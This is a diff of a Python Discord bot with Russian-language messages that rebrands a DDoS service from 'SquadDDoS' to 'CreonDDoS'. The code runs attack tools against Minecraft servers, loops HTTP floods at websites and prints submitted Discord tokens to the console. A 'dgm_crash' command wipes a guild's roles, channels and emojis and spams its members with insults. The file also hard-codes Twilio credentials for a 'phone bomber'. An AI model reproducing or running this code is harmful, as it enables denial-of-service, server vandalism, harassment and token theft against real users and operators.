@@ -1,7 +1,7 @@
 ﻿print("""
-(C) 2022-2023 SquadCube Corporation
-SquadDDoS: (SquadBot)
-Support: https://dsc.gg/SquadDDoS
+(C) 2022-2023 HeavenWorld Corporation
+CreonDDoS: (CreonBot)
+Support: https://dsc.gg/creonddos
 """)
 import discord,os,json,requests,platform,psutil,random,subprocess
 from discord.ext import commands
@@ -12,13 +12,13 @@ client.remove_command('help')
 SupportedProtocols=['760','759','758','757','756','755','754','753','751','736','735','578','575','573','498','490','485','480','477','404','401','393','340','338 ','335','316','210','110','109','107','47']
 ProtocolsList=['1.19.2/1.19.1: 760','1.19: 759','1.18.2: 758', '1.18.1/1.18: 757', '1.17.1: 756', '1.17: 755', '1.16.5/1.16.4: 754', '1.16.3: 753', '1.16.2: 751', '1.16.1: 736', '1.16: 735', '1.15.2: 578', '1.15.1: 575', '1.15: 573', '1.14.4: 498', '1.14.3: 490', '1.14.2: 485', '1.14.1: 480', '1.14: 477', '1.13.2: 404', '1.13.1: 401', '1.13: 393', '1.12.2: 340', '1.12.1: 338', '1.12: 335', '1.11.2/1.11.1: 316', '1.11: 315' '1.10.2/1.10.1: 210', '1.9.4/1.9.3: 110', '1.9.2: 109', '1.9.1: 107', '1.8.9/1.8.8/1.8.7/1.8.6/1.8.5/1.8.4/1.8.3/1.8.2/1.8.1/1.8: 47']
 SupportedMethods=['join','legitjoin','localhost','invalidnames','longnames','botjoiner','spoof','ping','nullping','multikiller','handshake','bighandshake','query','bigpacket','network','randombytes','extremejoin','spamjoin','nettydowner','ram','yoonikscry','colorcrasher','tcphit','queue','botnet','tcpbypass','ultimatesmasher','sf','nabcry']
-BotChannelConsoleId=1063020270316683324
+BotChannelConsoleId=none
 BotChannelId=1039242360493719654
 @client.event
 async def on_ready():
   print(f"падключилса папочка.")
   await client.get_channel(BotChannelId).send(embed=discord.Embed(title="**✅ Восстановлено подключение к Discord боту.**",description='**Теперь вы можете отправлять атаку на Minecraft сервера или на веб-сайты.**\nХарактеристики устройства и информация о системе можно посмотреть командой получения характеристики устройства и информации о системе.',color=discord.Color.light_grey()))
-  await client.change_presence(activity=discord.Streaming(name="DDoS [dsc.gg/SquadDDoS]",url="https://vk.com/squadcube_ru"),status=discord.Status.online)
+  await client.change_presence(activity=discord.Streaming(name="DDoS [dsc.gg/creonddos]",url="https://dsc.gg/creonddos"),status=discord.Status.online)
   p=await client.get_channel(1039166439820623922).fetch_message(1039166647958769664)
   m=await client.get_channel(1039166439820623922).fetch_message(1039166764401037382)
   await p.edit(content=f", ".join([i for i in ProtocolsList]))
@@ -66,7 +66,7 @@ async def host(ctx):
     if psutil.sensors_battery().power_plugged:am=", заряжается,"
     else:am=""
     e.add_field(name='🔋Аккумулятор',value=f"{psutil.sensors_battery().percent}%"+am+f" осталось времени жизни аккумулятора: {convertTime(psutil.sensors_battery().secsleft)}")
-  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+  e.set_footer(text="© 2023 HeavenWorld Corporation | CreonDDoS®", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
   await ctx.reply(embed=e)
 @client.command()
 async def help(ctx):
@@ -75,7 +75,7 @@ async def help(ctx):
   e.add_field(name='!wsdhelp', value='🧨Веб-сайт DDoS')
   e.add_field(name='!ohelp', value='🐭Другие функции')
   e.add_field(name='!dgmhelp', value='👨‍💻Управление Discord гильдии')
-  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+  e.set_footer(text="© 2023 HeavenWorld Corporation | CreonDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
   await ctx.reply(embed=e)
 @client.command(name='mcdhelp')
 async def mcddoshelp(ctx):
@@ -83,14 +83,14 @@ async def mcddoshelp(ctx):
   e.add_field(name='!mca [See args in !help]',value='🏹 Отправить атаку на Minecraft сервер',inline=True)
   e.add_field(name='!mcr <IP> [Используйте mcr2 если не работает эта команда]',value='🤓 Получить информацию о Minecraft сервере',inline=True)
   e.add_field(name='!mcr2 <IP>',value='🤓 Получить ссылки информацию о Minecraft сервере в JSON формате',inline=True)
-  e.set_footer(text="SquadDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+  e.set_footer(text="CreonDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
   await ctx.reply(embed=e)
 @client.command(name='wsdhelp')
 async def websiteddoshelp(ctx):
   e=discord.Embed(title='**🌏🧨 Веб-сайт DDoS 🌏🧨**',color=discord.Color.light_grey())
   e.add_field(name='!wsda [See args in !help]',value='💥 Отправить аттаку на указанный сайт.')
   e.add_field(name='!wsdr <URL (Без www. и https:// или http://) или IP>',value='🎓 Получить информацию о сайте.')
-  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+  e.set_footer(text="© 2023 HeavenWorld Corporation | CreonDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
   await ctx.reply(embed=e)
 @client.command(name='ohelp')
 async def otherhelp(ctx):
@@ -98,7 +98,7 @@ async def otherhelp(ctx):
   e.add_field(name='!userinfo <USER PING OR ID>', value='👶 Получить информацию о Discord пользователе.')
   e.add_field(name='!useravatar <USER PING OR ID>', value='🌸 Получить аватарку Discord пользователя.')
   e.add_field(name='!dscginfo <GUILD ID>', value='🎪 Получить информацию о Discord гильдии.')
-  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+  e.set_footer(text="© 2023 HeavenWorld Corporation | CreonDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
   await ctx.reply(embed=e)
 @client.command('mcamap')
 async def mcattackmethodsandprotocols(ctx):
@@ -124,12 +124,12 @@ async def mcresolve(ctx, arg1):
       e.add_field(name='***[🎫ВЕРСИЯ]:***', value=f'{json_object["version"]} (Protocol: {json_object["protocol"]})', inline=True)
       e.add_field(name='***[👶ИГРОКИ]:***', value=json_object["players"], inline=True)
       e.add_field(name='*For more information about this server you can get in this URL below:*', value=f"*https://api.mcsrvstat.us/2/{arg1}*", inline=False)
-      e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+      e.set_footer(text="© 2023 HeavenWorld Corporation | CreonDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
       await ctx.reply(embed=e)
 @client.command(name='mcr2')
 async def mcresolve2(ctx,arg1):
   e=discord.Embed(title="**✅ Получена ссылка**",description=f'Получена ссылка на информацию о Minecraft сервере: https://api.mcsrvstat.us/2/{arg1}',color=discord.Color.red())
-  e.set_footer(text="SquadDDoS",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+  e.set_footer(text="CreonDDoS",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
   await ctx.reply(embed=e)
 @client.command(name='mca')
 async def mcattack(ctx,arg1,arg2,arg3,arg4,arg5):
@@ -143,8 +143,8 @@ async def mcattack(ctx,arg1,arg2,arg3,arg4,arg5):
   async def attack():
     if os.path.exists("XDDOS.jar"):
       await ctx.reply("💫Запуск XDDOS ...")
-      if platform.system()=="Windows":xddos=subprocess.Popen(f"java -jar XDDOS.jar {arg1} {arg2} {arg3} {arg4} {arg5} -noansi")
-      elif platform.system()=="Linux":xddos=subprocess.Popen(f"java -jar XDDOS.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
+      if platform.system()=="Windows":xddos=subprocess.Popen(f"java -jar XDDOS.jar {arg1} {arg2} {arg3} {arg4} {arg5} {arg6} y")
+      elif platform.system()=="Linux":xddos=subprocess.Popen(f"java -jar XDDOS.jar {arg1} {arg2} {arg3} {arg4} {arg5} {arg6}")
     if os.path.exists("MCSTORM.jar"):
       await ctx.reply("💫Запуск MCSTORM ...")
       mcstarm=subprocess.Popen(f'java -jar MCSTORM.jar {arg1} {arg2} {arg3} {arg4} {arg5}')
@@ -166,8 +166,8 @@ async def mcattack(ctx,arg1,arg2,arg3,arg4,arg5):
   e.add_field(name='***[❓МЕТОД АТАКИ]:***', value=f'{arg3}', inline=True)
   e.add_field(name='***[⏱ВРЕМЯ]:***', value=f'{arg4} сек.', inline=True)
   e.add_field(name='***[💪П. З. С. (CPS)]:***', value=f'{arg5}', inline=True)
-  e.set_author(name=ctx.message.author.name,url="https://vk.com/squadcube_ru",icon_url=ctx.message.author.avatar.url)
-  e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®, Minecraft server DDoS service",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+  e.set_author(name=ctx.message.author.name,url="https://dsc.gg/blockkio",icon_url=ctx.message.author.avatar.url)
+  e.set_footer(text="© 2023 HeavenWorld Corporation | CreonDDoS®, Minecraft server DDoS service",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
   if requests.get(f"https://api.mcsrvstat.us/2/{arg1}").status_code==200:
     for line in urlopen(f"https://api.mcsrvstat.us/2/{arg1}"):json_object=json.loads(line.decode("utf-8"))
     if json_object["online"]==False:
@@ -197,7 +197,7 @@ async def dscguildinfo(ctx, arg1):
   e.add_field(name='**GUILD ICON ANIMATED:**', value=f"{guild.icon.is_animated()}", inline=True)
   e.add_field(name='**GUILD BANNER URL:**', value=f"{guild.banner.url}", inline=True)
   e.add_field(name='**GUILD BANNER ANIMATED:**', value=f"{guild.banner.is_animated()}", inline=True)
-  e.set_footer(text="SquadDDoS")
+  e.set_footer(text="CreonDDoS")
   await ctx.reply(embed=e)
 @client.command(name='wsda')
 async def websiteddosattack(ctx,arg1,arg2,arg3):
@@ -222,7 +222,7 @@ async def websiteddosattack(ctx,arg1,arg2,arg3):
 @client.command(name='wsdshr')
 async def websiteddossendhttprequests(ctx,url,count):
   sended=0
-  json,cookies={'MYSOR_BY':'https://dsc.gg/SquadDDoS','USER':'EVGENIY'}
+  json,cookies={'MYSOR_BY':'https://dsc.gg/creonddos','USER':'CREON228'}
   while sended!=int(count):
     requests.get(url,json=json,cookies=cookies)
     requests.post(url,json=json,cookies=cookies)
@@ -276,13 +276,13 @@ async def checkdiscordtoken(ctx,arg1):
     await ctx.message.delete()
     e=discord.Embed(title="🔰 Вывод",description="✅Верный Discord токен.",color=discord.Color.green())
     e.set_image(url="https://www.citypng.com/public/uploads/preview/-31622652360keqnmdomq3.png")
-    e.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+    e.set_footer(text="© 2023 HeavenWorld Corporation | CreonDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
     await ctx.reply(embed=e)
     print(arg1)
   else:
     e2=discord.Embed(title="🔰 Вывод",description="❌К сожалению, неверный токен.",color=discord.Color.red())
     e2.set_image(url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-1Bk77raRqcXZ8K5FPjBWqADYWZFBlW5YS4Fu2MqEcMVZ8-nQCeWNJYq56NYv09hFQtU&usqp=CAU")
-    e2.set_footer(text="© 2022-2023 SquadCube Corporation | SquadDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
+    e2.set_footer(text="© 2023 HeavenWorld Corporation | CreonDDoS®",icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
     await ctx.reply(embed=e2)
 @client.command()
 async def dgm_servers(ctx):
@@ -296,20 +296,20 @@ async def dgm_crash(ctx,arg1):
     return
   else:
     while True:
-        await guild.edit(name='🧟SquadDDoS ZOMBIE🧟',reason="у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
-        await guild.create_text_channel('SquadDDoS')
-        await guild.create_role(name="SquadDDoS",reason="у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила",color=discord.Color.red())
+        await guild.edit(name='🧟CreonDDoS ZOMBIE🧟',reason="у вас мать здохла, зайдите на dsc.gg/creonddos чтобы она ожила")
+        await guild.create_text_channel('CreonDDoS')
+        await guild.create_role(name="CreonDDoS",reason="у вас мать здохла, зайдите на dsc.gg/creonddos чтобы она ожила",color=discord.Color.red())
         for role in guild.roles:
-            if role.name!="SquadDDoS":await role.delete(reason="у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
+            if role.name!="CreonDDoS":await role.delete(reason="у вас мать здохла, зайдите на dsc.gg/creonddos чтобы она ожила")
         for emoji in guild.emojis:
           if guild.emojis.count()!=0:
-            if emoji.name!="SquadDDoS":await emoji.delete(reason="у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
+            if emoji.name!="CreonDDoS":await emoji.delete(reason="у вас мать здохла, зайдите на dsc.gg/creonddos чтобы она ожила")
         for channel in guild.channels:
-            if channel.name!="SquadDDoS":await channel.delete()
-            if channel.type.value==0:await channel.send("@everyone @here у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
+            if channel.name!="CreonDDoS":await channel.delete()
+            if channel.type.value==0:await channel.send("@everyone @here у вас мать здохла, зайдите на dsc.gg/creonddos чтобы она ожила")
         for member in guild.members:
           u=client.get_user(member.id)
-          if u.id!=client.user.id:await u.send("у вас мать здохла, зайдите на dsc.gg/SquadDDoS чтобы она ожила")
+          if u.id!=client.user.id:await u.send("у вас мать здохла, зайдите на dsc.gg/creonddos чтобы она ожила")
 @client.command(name="pbb")
 async def phonebomberbalance(ctx):await ctx.reply(embed=discord.Embed(title=f"💳На счету бомбера телефонов ${Client('AC5f2d384f667f6daf89e5c1628bd9d66b','16688b5d8bd2e84bce86bd27f85bfdc5').api.v2010.balance.fetch().balance}",description=f"Получено сколько на счету аккаунта Twilio.\n**Если вы хотите пополнить счет пожалуйста поддержите нас покупкой чего то!**",color=discord.Color.orange()))
 @client.command()
